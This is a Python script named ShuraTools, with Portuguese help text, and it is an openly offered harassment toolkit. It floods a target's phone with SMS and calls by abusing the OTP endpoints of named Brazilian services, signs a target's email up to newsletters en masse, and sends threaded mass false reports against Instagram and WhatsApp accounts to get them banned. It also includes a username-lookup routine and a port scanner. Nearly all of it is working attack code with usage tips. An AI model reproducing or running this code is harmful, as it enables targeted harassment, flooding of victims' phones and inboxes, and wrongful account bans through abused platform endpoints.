#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v11.0 MASS REPORT EDITION
Baseado em: Instagram-Reports + SpamReport + X_BOMB
"""

import os, sys, time, random, threading, socket, smtplib
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install requests colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}  [ SMS/Call/Email Bomber + Mass Report ]
{Fore.WHITE}  v11.0 MASS REPORT EDITION - by Shura
"""

LOCK = threading.Lock()
stats = {"success": 0, "fail": 0}

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def log(m, t="i"):
    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")

def safe_int(p, d):
    try: return int(input(p) or d)
    except: return d

def show_help(mode):
    helps = {
        "sms": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: SMS BOMBER                       ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766 (DDI+DDD+Número)
{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 20-50 (recomendado)
{Fore.YELLOW}Threads:{Style.RESET_ALL} 5-10
{Fore.YELLOW}Delay:{Style.RESET_ALL} 2-3 segundos
""",
        "call": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: CALL BOMBER                      ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766
{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 5-15 (chamadas são pesadas)
{Fore.YELLOW}Threads:{Style.RESET_ALL} 3-5
{Fore.YELLOW}Delay:{Style.RESET_ALL} 3-5 segundos
""",
        "email": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: EMAIL BOMBER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} vitima@gmail.com
{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 30-50
{Fore.YELLOW}Delay:{Style.RESET_ALL} 1-2 segundos
{Fore.RED}IMPORTANTE:{Style.RESET_ALL} E-mails vão para PROMOÇÕES/SPAM!
""",
        "ig": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║          COMO USAR: INSTAGRAM MASS REPORT                ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} Digite o @ do Instagram {Fore.RED}SEM O @{Style.RESET_ALL}
{Fore.YELLOW}Exemplo:{Style.RESET_ALL} {Fore.GREEN}elonmusk{Style.RESET_ALL} (NÃO @elonmusk)
{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 50-200 reports
{Fore.YELLOW}Motivo:{Style.RESET_ALL}
  1 - Spam
  2 - Conteúdo Inapropriado
  3 - Assédio/Bullying
  4 - Discurso de Ódio
  5 - Violência
{Fore.RED}AVISO:{Style.RESET_ALL} Muitos reports podem banir a conta!
""",
        "zap": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║          COMO USAR: WHATSAPP MASS REPORT                 ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766 (DDI+DDD+Número)
{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 20-100 reports

{Fore.YELLOW}Método:{Style.RESET_ALL}
  1 - API Report (rápido)
  2 - Email Report (efetivo)

{Fore.YELLOW}Email Report:{Style.RESET_ALL}
  → Envia e-mails para support@whatsapp.com
  → Requer Gmail configurado
  → Mais efetivo para banimento

{Fore.RED}AVISO:{Style.RESET_ALL} Email Report requer senha de app do Gmail!
""",
        "osint": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: OSINT HUNTER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} elonmusk (SEM @)
{Fore.YELLOW}Busca em:{Style.RESET_ALL} 10 redes sociais
{Fore.YELLOW}Mostra:{Style.RESET_ALL} Links clicáveis dos perfis
""",
        "port": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: PORT SCANNER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} 8.8.8.8 ou google.com
{Fore.YELLOW}Escaneia:{Style.RESET_ALL} 14 portas comuns
"""
    }
    print(helps.get(mode, ""))

# ========== BOMBERS ==========
BOMBERS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
    ]
}

def bomber(target, mode, qty, threads, delay):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = BOMBERS.get(mode, [])
    log(f"Iniciando {mode.upper()} Bomber", "w")
    
    def attack(api, idx):
        try:
            data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
            res = requests.post(api["u"], json=data, headers=api["h"], timeout=10)
            if res.status_code < 400:
                with LOCK: stats["success"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
            else:
                with LOCK: stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
            time.sleep(delay)
        except:
            with LOCK: stats["fail"] += 1
            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for i in range(qty):
            exe.submit(attack, random.choice(apis), i)
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== INSTAGRAM MASS REPORT ==========
def ig_report(username, qty, reason):
    log(f"Instagram Mass Report: @{username}", "w")
    
    reasons = {
        "1": "spam",
        "2": "inappropriate",
        "3": "harassment",
        "4": "hate_speech",
        "5": "violence"
    }
    
    reason_id = reasons.get(reason, "spam")
    
    def report(idx):
        try:
            res = requests.post(
                "https://i.instagram.com/api/v1/users/web_report/",
                data={
                    "username": username,
                    "source_name": "profile",
                    "reason_id": reason_id,
                    "is_spam": "true"
                },
                headers={"User-Agent": "Instagram 150.0.0.0 Android"},
                timeout=5
            )
            if res.status_code < 400:
                log(f"Report {idx+1}/{qty} → OK", "s")
            else:
                log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
        except:
            log(f"Report {idx+1}/{qty} → Timeout", "e")
    
    with ThreadPoolExecutor(max_workers=10) as exe:
        for i in range(qty):
            exe.submit(report, i)
            time.sleep(0.5)

# ========== WHATSAPP MASS REPORT ==========
def zap_report(phone, qty, method):
    log(f"WhatsApp Mass Report: {phone}", "w")
    
    if method == "1":  # API Report
        def report(idx):
            try:
                res = requests.post(
                    "https://v.whatsapp.net/v2/report",
                    data={"phone": phone, "reason": "spam"},
                    headers={"User-Agent": "WhatsApp/2.21.4.22"},
                    timeout=5
                )
                if res.status_code < 400:
                    log(f"Report {idx+1}/{qty} → OK", "s")
                else:
                    log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
            except:
                log(f"Report {idx+1}/{qty} → Timeout", "e")
        
        with ThreadPoolExecutor(max_workers=10) as exe:
            for i in range(qty):
                exe.submit(report, i)
                time.sleep(0.5)
    
    else:  # Email Report (mais efetivo)
        log("Email Report requer configuração de Gmail!", "w")
        gmail = input(f"{Fore.YELLOW}Seu Gmail: {Style.RESET_ALL}").strip()
        senha = input(f"{Fore.YELLOW}Senha de App: {Style.RESET_ALL}").strip()
        
        for i in range(qty):
            try:
                msg = MIMEText(f"Reportando número {phone} por spam e violação dos termos.")
                msg['Subject'] = f"Report Spam - {phone}"
                msg['From'] = gmail
                msg['To'] = "support@whatsapp.com"
                
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(gmail, senha)
                server.send_message(msg)
                server.quit()
                
                log(f"Email Report {i+1}/{qty} → Enviado", "s")
                time.sleep(2)
            except:
                log(f"Email Report {i+1}/{qty} → Falhou", "e")

# ========== OSINT ==========
def osint(t):
    log(f"OSINT: {t}", "w")
    u = t.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}"
    }
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
                print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
            else:
                log(f"{name}: Não encontrado", "i")
        except:
            log(f"{name}: Timeout", "e")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

# ========== PORT SCANNER ==========
def portscan(t):
    log(f"Scanning {t}...", "w")
    try:
        ip = socket.gethostbyname(t)
        log(f"IP: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
            s.close()
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    except Exception as e:
        log(f"Erro: {e}", "e")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 60)
            print(f"{Fore.RED}[ 1 ] SMS Bomber")
            print(f"{Fore.RED}[ 2 ] Call Bomber")
            print(f"{Fore.RED}[ 3 ] Email Bomber")
            print(f"{Fore.RED}[ 4 ] Instagram Mass Report")
            print(f"{Fore.RED}[ 5 ] WhatsApp Mass Report")
            print("-" * 60)
            print(f"{Fore.WHITE}[ 6 ] OSINT Hunter")
            print(f"{Fore.WHITE}[ 7 ] Port Scanner")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 60)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3"]:
                mode = {"1": "sms", "2": "call", "3": "email"}[opt]
                show_help(mode)
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                if mode in ["sms", "call"] and (not t.isdigit() or len(t) < 10):
                    log("Número inválido!", "e"); time.sleep(2); continue
                elif mode == "email" and "@" not in t:
                    log("E-mail inválido!", "e"); time.sleep(2); continue
                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
                threads = safe_int(f"{Fore.YELLOW}Threads: {Style.RESET_ALL}", 5)
                delay = safe_int(f"{Fore.YELLOW}Delay: {Style.RESET_ALL}", 2)
                bomber(t, mode, qty, threads, delay)
            
            elif opt == "4":
                show_help("ig")
                t = input(f"{Fore.YELLOW}Target (SEM @): {Style.RESET_ALL}").strip()
                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 50)
                reason = input(f"{Fore.YELLOW}Motivo (1-5): {Style.RESET_ALL}").strip()
                ig_report(t, qty, reason)
            
            elif opt == "5":
                show_help("zap")
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
                method = input(f"{Fore.YELLOW}Método (1-API / 2-Email): {Style.RESET_ALL}").strip()
                zap_report(t, qty, method)
            
            elif opt == "6":
                show_help("osint")
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                osint(t)
            
            elif opt == "7":
                show_help("port")
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                portscan(t)
            
            input(f"\n{Fore.GREEN}ENTER para voltar...{Style.RESET_ALL}")
            
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "e"); input("\nENTER...")

if __name__ == "__main__":
    menu()
